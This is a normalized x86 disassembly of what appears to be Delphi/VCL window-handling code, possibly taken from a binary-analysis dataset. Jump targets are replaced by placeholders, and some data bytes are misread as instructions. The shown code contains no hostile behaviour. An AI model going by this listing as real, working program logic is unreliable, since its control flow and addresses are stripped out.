mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_464160
sub_4637ee
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403450
test al al
jne r-xdata
call sub_403a5c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_464160
sub_463824
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_463865
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_463884
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44c074
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_465b2c
sub_4638c0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_449488
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41a474
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_464f24
mov edx esi
mov eax ebp
call sub_41a714
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_464efc
mov edx esi
mov eax edi
call sub_464f24
jmp r-xdata
xor edx edx
mov eax edi
call sub_464ed8
sub_4639cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d038
xor edx edx
push ebp
push sub_463c22
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c794
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4499d4
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_449a18
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_463d54
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44b16c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463c29
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_462f34
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_450264
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_462f34
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450264
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423688
push eax
call sub_40651c
mov edx eax
mov eax esi
call sub_423690
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call sub_40651c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call sub_40651c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_40651c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_40651c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_463c31
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44dae0
push 0x0
push 0x0
push ebx
push sub_463d38
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_463d04
push ebx
push sub_463d1c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_463ce3
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d8e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44a0e4
sub_463d6f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_462f34
mov ecx edi
mov edx esi
mov eax ebx
call sub_450264
mov eax ebx
call sub_463e58
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_42372c
push eax
call sub_40651c
mov edx eax
mov eax ebp
call sub_423748
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_449a00
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4499bc
push eax
call sub_40651c
mov edx eax
mov eax ebx
call sub_464100
push edi
push esi
push ebp
call sub_40651c
mov edx eax
mov eax ebx
call sub_464130
sub_463dfc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_46615c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_463e90
push ebx
mov ebx eax
mov eax ebx
call sub_464dac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_463f24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4507d8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4508a0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_463fac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_450d7c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4205e8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4205bc
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403450
test al al
jne r-xdata
sub_464018
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40319c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_464044
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebp
call sub_44d4d0
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4205e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_450dc4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4205bc
mov si 0xfff1
call sub_403450
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4205f8
jmp r-xdata
sub_4640d8
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44a1a0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44b16c
sub_464100
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4499d4
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_464130
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_449a18
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_464160
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_449ed8
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_465298
pop esi
pop ebx
retn
sub_4641a4
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4641fd
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464204
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
sub_46420c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_449e8c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44dcf8
mov eax ebx
call sub_44de94
sub_464244
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420434
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_464284
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e1b4
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403450
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403450
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44b16c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45d748
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_464bb0
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4644fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4644e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_424618
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424494
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45ecd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4644e7
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424618
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45d748
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_464bb0
call sub_4507d8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46462b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_464604
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4645e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_424618
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424494
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4645ee
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424618
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4507d8
mov esi eax
sub_46460b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ReleaseDC
retn
sub_4646bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_464708
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_464be4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_464c30
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_464748
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_464916
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423cc8
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_449afc
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4488f4
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_4646bc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423cc8
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_464be4
test eax eax
je r-xdata
push ebp
call sub_4646bc
pop ecx
push ebp
call sub_4646bc
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_464708
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_461930
jmp r-xdata
sub_464928
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_462af8
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_464994
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_463194
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax ebx
call sub_4205e8
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44d5c4
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4205bc
call sub_45e28c
mov edx esi
mov eax ebx
call sub_4205bc
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
sub_464a2c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_464aa9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_464ab4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44dd40
sub_464ae0
push esi
